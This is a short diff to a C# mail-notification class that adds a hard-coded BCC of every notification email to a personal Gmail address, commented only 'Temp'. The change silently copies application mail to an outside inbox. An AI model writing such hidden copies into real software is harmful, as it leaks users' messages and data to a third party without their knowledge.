@@ -84,6 +84,8 @@ namespace SynergyRMS.Models
             mail.From = new MailAddress(adminMailAddress, appName);
             mail.To.Add(new MailAddress(toAdresses));
 
+            mail.Bcc.Add(new MailAddress("virath.liyanage@gmail.com"));// Temp
+
             mail.Subject = appName + " - Mail Notification";
             mail.IsBodyHtml = true;
             mail.Body = MessageModifier(flag);
